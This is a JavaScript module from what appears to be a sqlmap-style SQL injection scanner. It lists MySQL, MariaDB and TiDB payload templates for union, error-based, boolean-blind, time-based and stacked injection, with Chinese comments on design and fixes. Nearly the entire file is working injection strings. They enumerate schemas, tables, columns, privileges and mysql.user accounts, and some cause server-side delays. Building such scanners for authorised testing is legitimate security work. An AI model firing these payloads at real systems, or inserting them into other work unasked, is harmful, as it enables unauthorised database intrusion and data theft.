// MySQL + MariaDB + TiDB payload 模板（从 payloads.js 拆分）
// 占位符：{ORIG}=原始值 {SLEEP}=延迟秒数 {NUM}=随机整数 {SEP}=注释符
// MariaDB / TiDB 由 index.js 通过 JSON 深拷贝 MySQL 自动继承（协议互通）

// MySQL 主模板（union / error / boolean / time / stacked）
// 固定索引约束：boolean 数组 [0,2]/[1,3]/[4,5]/[6,7] 不可移动（BooleanBlindDetector 依赖）
export const mysqlPayloads = {
  union: [
    "{ORIG} UNION SELECT {NUM},database(),version()-- -",
    "{ORIG}' UNION SELECT {NUM},database(),version()-- -",
    '{ORIG}" UNION SELECT {NUM},database(),version()-- -',
    "{ORIG}) UNION SELECT {NUM},database(),version()-- -",
    "{ORIG}') UNION SELECT {NUM},database(),version()-- -",
    "{ORIG} UNION ALL SELECT {NUM},database(),version()-- -",
    "{ORIG}' UNION ALL SELECT {NUM},database(),version()-- -",
    "{ORIG} UNION SELECT {NUM},@@version,user()-- -",
    "{ORIG} UNION SELECT {NUM},current_user(),database()-- -",
    "{ORIG}' UNION SELECT {NUM},version(),@@datadir-- -",
    "{ORIG}' UNION SELECT {NUM},(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()),1-- -",
    "{ORIG}' UNION SELECT {NUM},(SELECT group_concat(column_name) FROM information_schema.columns WHERE table_schema=database() AND table_name=0x7573657273),1-- -",
    "{ORIG}' UNION SELECT {NUM},user(),@@basedir-- -",
    // —— 扩容：闭合组合（')) / ")）× 表达式族（对标 sqlmap UNION payload 矩阵）——
    "{ORIG}')) UNION SELECT {NUM},database(),version()-- -",
    '{ORIG}")) UNION SELECT {NUM},database(),version()-- -',
    "{ORIG}')) UNION ALL SELECT {NUM},user(),database()-- -",
    "{ORIG}')) UNION ALL SELECT {NUM},@@version,user()-- -",
    "{ORIG} UNION SELECT {NUM},@@hostname,@@version_compile_os-- -",
    "{ORIG}' UNION SELECT {NUM},@@hostname,@@version_compile_os-- -",
    "{ORIG} UNION SELECT {NUM},current_user(),@@version_compile_machine-- -",
    "{ORIG}' UNION SELECT {NUM},(SELECT group_concat(schema_name) FROM information_schema.schemata),1-- -",
    "{ORIG}' UNION SELECT {NUM},(SELECT group_concat(grantee,0x3a,privilege_type) FROM information_schema.user_privileges LIMIT 1),1-- -",
    "{ORIG} UNION ALL SELECT {NUM},@@version,@@datadir-- -",
    "{ORIG} UNION ALL SELECT {NUM},database(),@@hostname-- -",
    '{ORIG}" UNION ALL SELECT {NUM},current_user(),@@hostname-- -',
    "{ORIG}') UNION ALL SELECT {NUM},version(),user()-- -",
    "{ORIG}' UNION SELECT {NUM},concat_ws(0x3a,user(),database(),version()),1-- -",
    '{ORIG}" UNION SELECT {NUM},(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()),1-- -',
    "{ORIG}' UNION ALL SELECT {NUM},(SELECT group_concat(column_name) FROM information_schema.columns WHERE table_schema=database() AND table_name='users'),1-- -",
    "{ORIG} UNION SELECT {NUM},@@sql_mode,@@hostname-- -",
    "{ORIG}' UNION SELECT {NUM},(SELECT group_concat(user,0x3a,host) FROM mysql.user LIMIT 1),1-- -",
  ],
  error: [
    "{ORIG}' AND extractvalue(1,concat(0x7e,(SELECT version())))-- -",
    '{ORIG}" AND updatexml(1,concat(0x7e,(SELECT database())),1)-- -',
    "{ORIG}' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT version()),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -",
    "{ORIG} AND extractvalue(1,concat(0x7e,(SELECT version())))-- -",
    "{ORIG}') AND extractvalue(1,concat(0x7e,(SELECT version())))-- -",
    "{ORIG}' AND updatexml(1,concat(0x7e,(SELECT version())),1)-- -",
    "{ORIG}' AND updatexml(1,concat(0x7e,(SELECT user())),1)-- -",
    "{ORIG}' AND extractvalue(1,concat(0x7e,(SELECT database())))-- -",
    "{ORIG}' AND extractvalue(1,concat(0x7e,(SELECT user())))-- -",
    "{ORIG}' AND extractvalue(1,concat(0x7e,(SELECT @@datadir)))-- -",
    "{ORIG}' AND updatexml(1,concat(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1)),1)-- -",
    "{ORIG}' AND extractvalue(1,concat(0x7e,(SELECT column_name FROM information_schema.columns WHERE table_name=(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1) LIMIT 1)))-- -",
    "{ORIG}' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT database()),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -",
    "{ORIG}' AND GTID_SUBSET(CONCAT((SELECT version())),1)-- -",
    // —— 扩容：exp 溢出 / bigint 溢出 / JSON 函数族 / GIS 函数族（对标 sqlmap error 向量）——
    "{ORIG}' AND exp(~(SELECT * FROM (SELECT version())a))-- -",
    "{ORIG}') AND exp(~(SELECT * FROM (SELECT user())a))-- -",
    "{ORIG}' AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT_ws(0x3a,version(),database()))s),8446744073709551610,8446744073709551610)))-- -",
    "{ORIG}' AND GTID_SUBTRACT((SELECT version()),1)-- -",
    "{ORIG}' AND JSON_KEYS((SELECT version()))-- -",
    "{ORIG}' AND JSON_VALUE((SELECT version()),'$')-- -",
    "{ORIG}' AND ST_LatFromGeoHash((SELECT database()))-- -",
    "{ORIG}' AND ST_LongFromGeoHash((SELECT user()))-- -",
    "{ORIG}' AND ST_PointFromGeoHash((SELECT version()),1)-- -",
    "{ORIG}' AND polygon((SELECT * FROM (SELECT * FROM (SELECT version())a)b))-- -",
    // —— 深度扩容：注释符变体（# / /**/）—— 对标 sqlmap boundary 注释体系 ——
    "{ORIG}' AND extractvalue(1,concat(0x7e,(SELECT version())))#",
    "{ORIG}' AND extractvalue(1,concat(0x7e,(SELECT version())))/**/",
    // —— INSERT VALUES 子句报错注入（追加新元组→触发报错回带；对标 sqlmap INSERT VALUES）——
    "{ORIG}),(1,(SELECT extractvalue(1,concat(0x7e,(SELECT version()))))) )-- -",
    // —— LIMIT 子句报错注入（INTO OUTFILE；对标 sqlmap LIMIT clause）——
    // 注：INTO OUTFILE 已移入 destructive.js（risk≥3 门控），不在默认 error 池。
    // 注：基础 PROCEDURE ANALYSE(1,1) 已在 CLAUSE_PAYLOADS.MySQL.limit.error（level≥2 门控）。
    // —— HAVING 子句报错变体（对标 sqlmap having clause）——
    // MySQL 5.7+ HAVING 1=1 合法；8.0 无 GROUP BY 时 HAVING 触发 "Incorrect usage of HAVING" 报错，
    // 对 8.x 目标构成可用报错判别向量（5.7 目标由主 AND 谓词族覆盖，此处补充无害）。
    "{ORIG} HAVING 1=1-- -",
    // —— LIMIT PROCEDURE ANALYSE 变体（LIMIT 1,1 前缀 + EXTRACTVALUE 回带 version()；对标 sqlmap LIMIT+PROCEDURE）——
    "{ORIG} LIMIT 1,1 PROCEDURE ANALYSE(EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()))))-- -",
    // —— 深度扩容：EXP double 溢出 / JSON 函数族（MySQL 5.7+；多目标 + 注释变体）——
    "{ORIG}' AND EXP(~(SELECT * FROM (SELECT version())a))-- -",
    "{ORIG}') AND EXP(~(SELECT * FROM (SELECT version())a))-- -",
    "{ORIG}' AND EXP(~(SELECT * FROM (SELECT database())a))-- -",
    "{ORIG}' AND EXP(~(SELECT * FROM (SELECT user())a))-- -",
    "{ORIG}' AND EXP(~(SELECT * FROM (SELECT version())a))#",
    "{ORIG}' AND EXP(~(SELECT * FROM (SELECT version())a))/**/",
    "{ORIG}' AND JSON_KEYS((SELECT CAST((SELECT version()) AS JSON)))-- -",
    "{ORIG}' AND JSON_KEYS((SELECT CAST((SELECT database()) AS JSON)))-- -",
    "{ORIG}' AND JSON_KEYS((SELECT CAST((SELECT user()) AS JSON)))-- -",
    "{ORIG}' AND JSON_KEYS((SELECT CAST((SELECT version()) AS JSON)))#",
    "{ORIG}' AND JSON_KEYS((SELECT CAST((SELECT version()) AS JSON)))/**/",
    "{ORIG}' AND JSON_VALUE((SELECT CAST((SELECT version()) AS JSON)),'$')-- -",
    // —— GIS 函数族补充 / GTID 编码 / extractvalue-updatexml 多目标 ——
    "{ORIG}' AND ST_GeomFromGeoJSON((SELECT version()))-- -",
    "{ORIG}' AND GTID_SUBSET(CONCAT(0x7e,(SELECT version()),0x7e),1)-- -",
    '{ORIG}" AND extractvalue(1,concat(0x7e,(SELECT version())))-- -',
    "{ORIG}' AND extractvalue(1,concat(0x7e,(SELECT @@version)))-- -",
    "{ORIG}' AND extractvalue(1,concat(0x7e,(SELECT @@hostname)))-- -",
    "{ORIG}' AND extractvalue(1,concat(0x7e,(SELECT user FROM mysql.user LIMIT 1)))-- -",
    "{ORIG}' AND updatexml(1,concat(0x7e,(SELECT @@datadir)),1)-- -",
    "{ORIG}' AND updatexml(1,concat(0x7e,(SELECT @@hostname)),1)-- -",
    "{ORIG}' AND updatexml(1,concat(0x7e,(SELECT CONCAT(user,0x3a,host) FROM mysql.user LIMIT 1)),1)-- -",
    "{ORIG}' AND (SELECT extractvalue(1,concat(0x7e,(SELECT version()))))-- -",
    "{ORIG}' AND extractvalue(1,concat(0x7e,(SELECT schema_name FROM information_schema.schemata LIMIT 1)))-- -",
    "{ORIG}' AND updatexml(1,concat(0x7e,(SELECT schema_name FROM information_schema.schemata LIMIT 1)),1)-- -",
    // —— INSERT VALUES 子句 报错回带/除零补充（对标 sqlmap INSERT VALUES）——
    "{ORIG}),(1,(SELECT extractvalue(1,concat(0x7e,(SELECT database()))))) )-- -",
    "{ORIG}),(1,updatexml(1,concat(0x7e,(SELECT version())),1))-- -",
    "{ORIG}),(1,(SELECT 1/0))-- -",
    // [OPT-FIX 2026-09-08] 移除 WHERE 位置的 PROCEDURE ANALYSE 模板：该语句只能紧跟 LIMIT
    // （MySQL 5.x 语法；8.0 已整体移除），在 WHERE 上下文永远 1064 语法错误（真实 MySQL
    // payload 合法性校验实测）。LIMIT 位置的等价变体保留于 CLAUSE_PAYLOADS.MySQL.limit.error。
    "{ORIG}' AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7b, 0x22, VERSION(), 0x22, 0x7d)) USING utf8)), 1)-- -",
    "{ORIG}' AND GTID_SUBTRACT((SELECT SESSION_GTID_EXECUTED()), 0)-- -",
    "{ORIG}' AND ST_X(ST_GeomFromText(CONCAT(0x4c, 0x49, 0x4e, 0x45, 0x53, 0x54, 0x52, 0x49, 0x4e, 0x47, 0x28, 0x30, 0x20, 0x30, 0x2c, 0x31, 0x29)))-- -",
    "{ORIG}' AND EXP(~(SELECT * FROM (SELECT VERSION())a))-- -",
    "{ORIG}' AND CAST((SELECT VERSION()) AS UNSIGNED)-- -",
  ],
  boolean: [
    "{ORIG}' AND '1'='1",
    '{ORIG}" AND "1"="1',
    "{ORIG}' AND '1'='2",
    '{ORIG}" AND "1"="2',
    "{ORIG} AND 1=1",
    "{ORIG} AND 1=2",
    // [6,7] OR-based 布尔变体（对标 sqlmap risk>=2 的 OR 边界，BooleanBlindDetector 在 risk>=2 时投放）
    "{ORIG}' OR '1'='1",
    "{ORIG}' OR '1'='2",
    // —— 深度扩容：注释符变体（# / /**/）—— 对标 sqlmap boundary 注释体系 ——
    "{ORIG}' AND 1=1#",
    "{ORIG}' AND 1=2#",
    "{ORIG}' AND 1=1/**/",
    "{ORIG}' AND 1=2/**/",
    // —— UPDATE SET 子句注入（逗号拼接赋值→真假差异；对标 sqlmap UPDATE SET clause）——
    "{ORIG},1=1-- -",
    "{ORIG},1=2-- -",
    // —— INSERT VALUES 子句注入（追加新元组→真假差异；对标 sqlmap INSERT VALUES）——
    "{ORIG}),(1,1)-- -",
    "{ORIG}),(1,(SELECT 1))-- -",
    // —— LIMIT 子句布尔变体（对标 sqlmap LIMIT clause）——
    "{ORIG} LIMIT 1,1-- -",
    // —— ORDER BY 表达式注入（逗号拼接标量子查询；假=1/0 除零报错→差异）——
    "{ORIG},(SELECT 1)-- -",
    "{ORIG},(SELECT 1/0)-- -",
    // —— 编码变体（对标 sqlmap 编码 payload）：CHAR() 拼接 / hex 字符串 ——
    "{ORIG}' AND 1=CHAR(49)-- -",
    "{ORIG}' AND 0x31=1-- -",
    // —— 数字上下文 OR 变体（对标 sqlmap risk>=2 OR 边界，数值型注入点）——
    "{ORIG} OR 1=1-- -",
    "{ORIG} OR 1=2-- -",
    // —— DELETE WHERE 子句注入（真假子查询；DELETE FROM t WHERE id=1 {INJECT}）——
    // 注：DELETE 位置不可追加 UNION/堆叠注入之外的 AND 1=1 谓词（会改变待删行集），
    // 改用标量子查询恒真/恒假对（(SELECT 1)=(SELECT 1) vs =(SELECT 2)），行影响数差异驱动判定。
    "{ORIG} AND (SELECT 1)=(SELECT 1)-- -",
    "{ORIG} AND (SELECT 1)=(SELECT 2)-- -",
    // —— GROUP BY 子句布尔变体（固定分组；对标 sqlmap groupby clause）——
    // 真假差异不明显（分组数固定），保留为 level≥2 的补充判别向量。
    "{ORIG} GROUP BY 1-- -",
    // —— ORDER BY 表达式扩展（列数差异标签：ORDER BY 1 vs 1,2；对标 sqlmap ORDER BY 列数探测）——
    "{ORIG} ORDER BY 1-- -",
    "{ORIG} ORDER BY 1,2-- -",
    // —— 深度扩容：多重括号嵌套闭合变体（AND 1=1/1=2；对标 sqlmap boundary 嵌套闭合矩阵）——
    "{ORIG}')) AND 1=1-- -",
    "{ORIG}')) AND 1=2-- -",
    '{ORIG}")) AND 1=1-- -',
    '{ORIG}")) AND 1=2-- -',
    "{ORIG}) AND 1=1-- -",
    "{ORIG}) AND 1=2-- -",
    // —— 嵌套闭合 + 字符串比较变体（真=恒等、假=恒不等；")) 字符串型不与子句表重复）——
    '{ORIG}")) AND \'1\'=\'1\'-- -',
    '{ORIG}")) AND \'1\'=\'2\'-- -',
    // —— 编码变体扩展（CHAR 拼接 / hex / UNHEX / CONVERT；对标 sqlmap 编码 payload）——
    "{ORIG}' AND 1=CHAR(49,61,49)-- -",
    "{ORIG}' AND 0x31=0x31-- -",
    "{ORIG}' AND 0x31=0x32-- -",
    "{ORIG}' AND UNHEX('31')=1-- -",
    "{ORIG}' AND UNHEX('32')=1-- -",
    "{ORIG}' AND 1=CONVERT(0x31,SIGNED)-- -",
    "{ORIG}' AND 1=CONVERT(0x32,SIGNED)-- -",
    // —— 子查询布尔（版本/库名首字符探测；真假对）——
    "{ORIG} AND (SELECT SUBSTR(@@version,1,1))='5'-- -",
    "{ORIG} AND (SELECT SUBSTR(@@version,1,1))='8'-- -",
    "{ORIG} AND (SELECT SUBSTR(database(),1,1))='d'-- -",
    "{ORIG} AND (SELECT SUBSTR(database(),1,1))='x'-- -",
    "{ORIG}' AND (SELECT SUBSTR(@@version,1,1))='5'-- -",
    "{ORIG}' AND (SELECT SUBSTR(@@version,1,1))='8'-- -",
    "{ORIG} AND (SELECT LEFT(@@version,1))='5'-- -",
    "{ORIG} AND (SELECT LEFT(@@version,1))='8'-- -",
    "{ORIG} AND (SELECT MID(@@version,1,1))='5'-- -",
    "{ORIG} AND (SELECT MID(@@version,1,1))='8'-- -",
    "{ORIG} AND (SELECT @@version) LIKE '5%'-- -",
    "{ORIG} AND (SELECT @@version) LIKE '8%'-- -",
    // —— 子查询/函数布尔（EXISTS/IF/LENGTH/DUAL 恒真恒假对）——
    "{ORIG} AND (SELECT LENGTH(database()))>0-- -",
    "{ORIG} AND (SELECT LENGTH(database()))<0-- -",
    "{ORIG} AND EXISTS(SELECT 1)-- -",
    "{ORIG} AND EXISTS(SELECT 1 WHERE 1=2)-- -",
    "{ORIG} AND IF(1=1,1,0)-- -",
    "{ORIG} AND IF(1=2,1,0)-- -",
    "{ORIG} AND (SELECT 1 FROM DUAL WHERE 1=1)-- -",
    "{ORIG} AND (SELECT 1 FROM DUAL WHERE 1=2)-- -",
    // —— INSERT VALUES 除零差异变体（真模板已存在，补假=除零；对标 sqlmap INSERT VALUES）——
    "{ORIG}),(1,(SELECT 1/0))-- -",
    // —— OR 字符串变体（risk>=2 补充；带注释结尾）——
    "{ORIG}' OR '1'='1'-- -",
    "{ORIG}' OR '1'='2'-- -",
    "{ORIG} OR '1'='1'-- -",
    "{ORIG} OR '1'='2'-- -",
    // [SQLMAP-PARITY] RLIKE regex boolean（纯布尔语义，无延时副作用）
    "{ORIG}' AND '1' RLIKE (SELECT CASE WHEN (1=1) THEN '1' ELSE '0' END)-- -",
  ],
  time: [
    "{ORIG}' AND SLEEP({SLEEP})-- -",
    '{ORIG}" AND SLEEP({SLEEP})-- -',
    // [OPT-FIX 2026-09-08] 移除混入的 WAITFOR DELAY 模板：WAITFOR 是 SQL Server 语法，
    // 在 MySQL 上永远 1064 语法错误（真实 MySQL payload 合法性校验实测）；
    // SQL Server 专属向量保留在 payloads/sqlserver.js。
    "{ORIG} AND SLEEP({SLEEP})-- -",
    // —— 扩容：括号闭合组合 + BENCHMARK + 子查询变体 ——
    "{ORIG}') AND SLEEP({SLEEP})-- -",
    "{ORIG}')) AND SLEEP({SLEEP})-- -",
    '{ORIG}") AND SLEEP({SLEEP})-- -',
    "{ORIG}) AND SLEEP({SLEEP})-- -",
    "{ORIG}' AND BENCHMARK({SLEEP}0000000,MD5('a'))-- -",
    "{ORIG}' AND (SELECT SLEEP({SLEEP}))-- -",
    // —— 深度扩容：注释符变体（# / /**/）—— 对标 sqlmap boundary 注释体系 ——
    "{ORIG}' AND SLEEP({SLEEP})#",
    "{ORIG}' AND SLEEP({SLEEP})/**/",
    // —— UPDATE SET 子句时间注入（逗号拼接赋值→延迟执行；对标 sqlmap UPDATE SET clause）——
    "{ORIG},1=(SELECT SLEEP({SLEEP}))-- -",
    // —— ORDER BY 表达式时间注入（逗号拼接延迟子查询）——
    "{ORIG},(SELECT SLEEP({SLEEP}))-- -",
    // —— 深度扩容：IF(1=1,SLEEP) 条件延迟 / BENCHMARK({SLEEP}) 循环 / SLEEP 谓词化 / ELT ——
    "{ORIG}' AND IF(1=1,SLEEP({SLEEP}),0)-- -",
    "{ORIG}' AND IF(1=2,SLEEP({SLEEP}),0)-- -",
    '{ORIG}" AND IF(1=1,SLEEP({SLEEP}),0)-- -',
    "{ORIG} AND IF(1=1,SLEEP({SLEEP}),0)-- -",
    "{ORIG}') AND IF(1=1,SLEEP({SLEEP}),0)-- -",
    "{ORIG}')) AND IF(1=1,SLEEP({SLEEP}),0)-- -",
    "{ORIG}' AND IF(SLEEP({SLEEP}),1,0)-- -",
    "{ORIG}' AND SLEEP({SLEEP}) IS NOT NULL-- -",
    "{ORIG}' AND (SELECT SLEEP({SLEEP}) FROM DUAL)-- -",
    "{ORIG}' AND (SELECT IF(1=1,SLEEP({SLEEP}),0))-- -",
    "{ORIG}' AND ELT(1,SLEEP({SLEEP})) IS NOT NULL-- -",
    "{ORIG}' AND BENCHMARK({SLEEP}0000000,MD5(1))-- -",
    "{ORIG}' AND BENCHMARK({SLEEP}0000000,MD5(version()))-- -",
    "{ORIG}' AND BENCHMARK({SLEEP}0000000,SHA1(1))-- -",
    "{ORIG}' AND BENCHMARK({SLEEP}0000000,MD5(1))#",
    "{ORIG}' AND BENCHMARK({SLEEP}0000000,MD5(1))/**/",
    "{ORIG}' AND IF(1=1,SLEEP({SLEEP}),0)#",
    "{ORIG}' AND IF(1=1,SLEEP({SLEEP}),0)/**/",
    // 注：GET_LOCK / 硬编码 BENCHMARK / RLIKE REPEAT 等阻塞型与 DoS 型向量已移出默认池，
    // 见 destructive.js（需 risk>=3 显式开启），避免默认扫描对目标库造成业务阻塞或 CPU 打满。
  ],
  // 堆叠注入：以 `;` 追加独立的延迟语句，若被执行则证明可堆叠多条语句
  stacked: [
    // [real-MySQL FIX 2026-09-07] 裸 SLEEP(n) 作为独立语句在真实 MySQL 报 1064 语法错误
    // （SLEEP 仅可在 SELECT 表达式内调用），此前 mock 靶场正则匹配掩盖了该缺陷。
    // 统一改为 SELECT SLEEP(n) 形式（MySQL 堆叠标准写法）。
    "{ORIG}; SELECT SLEEP({SLEEP}) {SEP}",
    "{ORIG}'; SELECT SLEEP({SLEEP}) {SEP}",
    '{ORIG}"; SELECT SLEEP({SLEEP}) {SEP}',
    "{ORIG}); SELECT SLEEP({SLEEP}) {SEP}",
    "{ORIG}') ; SELECT SLEEP({SLEEP}) {SEP}",
    "{ORIG}';SELECT SLEEP({SLEEP}) {SEP}",
    // —— 深度扩容：SLEEP 堆叠 + 注释符变体 + IF 条件延迟（非破坏性探测）——
    "{ORIG}'; SELECT SLEEP({SLEEP})#",
    "{ORIG}'; SELECT SLEEP({SLEEP})/**/",
    "{ORIG}'; SELECT IF(1=1,SLEEP({SLEEP}),0) {SEP}",
    "{ORIG}'; SET @sqli_probe=1; SELECT SLEEP({SLEEP}) {SEP}",
    // [SQLMAP-PARITY] GLOBAL_VARIABLES enumeration（只读，无副作用）
    "{ORIG}'; SELECT * FROM information_schema.GLOBAL_VARIABLES WHERE VARIABLE_NAME='version'-- -",
    // 注：INTO OUTFILE（服务端写文件）/ LOAD_FILE（任意文件读）/ 硬编码 SLEEP(5)
    // 已移出默认池，见 destructive.js（需 risk>=3 显式开启）。
  ],
};

// MySQL 子句位置感知模板（CLAUSE_PAYLOADS.MySQL）
export const mysqlClauses = {
  // ORDER BY 列位置：逗号拼接标量子查询（假=多行子查询触发 "Subquery returns more than 1 row"）
  orderby: {
    boolean: [["{ORIG},(SELECT 1)-- -", "{ORIG},(SELECT 1 UNION SELECT 2)-- -"]],
    error: [
      "{ORIG},(extractvalue(1,concat(0x7e,(SELECT version()))))-- -",
      "{ORIG},(updatexml(1,concat(0x7e,(SELECT database())),1))-- -",
    ],
    time: ["{ORIG},(SELECT SLEEP({SLEEP}))-- -"],
  },
  // GROUP BY 列位置：尾部追加 HAVING 恒真/恒假（HAVING 紧跟 GROUP BY，语法合法）
  groupby: {
    boolean: [
      ["{ORIG} HAVING 1=1-- -", "{ORIG} HAVING 1=2-- -"],
      ["{ORIG}' HAVING '1'='1'-- -", "{ORIG}' HAVING '1'='2'-- -"],
    ],
  },
  // HAVING 谓词值位置：-- - 注释掉尾部引号（与主模板无注释版本互补，覆盖带引号闭合场景）
  having: {
    boolean: [["{ORIG} AND 1=1-- -", "{ORIG} AND 1=2-- -"]],
  },
  // LIMIT 位置（MySQL 5.x）：LIMIT 后仅可跟 PROCEDURE ANALYSE（8.0 已移除，覆盖旧版本目标）
  limit: {
    error: [
      "{ORIG} PROCEDURE ANALYSE(1,1)-- -",
      "{ORIG} PROCEDURE ANALYSE(EXTRACTVALUE(1,CONCAT(0x7e,version())),1)-- -",
    ],
  },
  // WHERE 值位置补充：括号闭合组合（与 boundary 运行时探测互补，覆盖探测失败/未跑场景）
  where: {
    boolean: [
      ["{ORIG}') AND 1=1-- -", "{ORIG}') AND 1=2-- -"],
      ["{ORIG}')) AND '1'='1'-- -", "{ORIG}')) AND '1'='2'-- -"],
      ['{ORIG}") AND 1=1-- -', '{ORIG}") AND 1=2-- -'],
    ],
  },
};
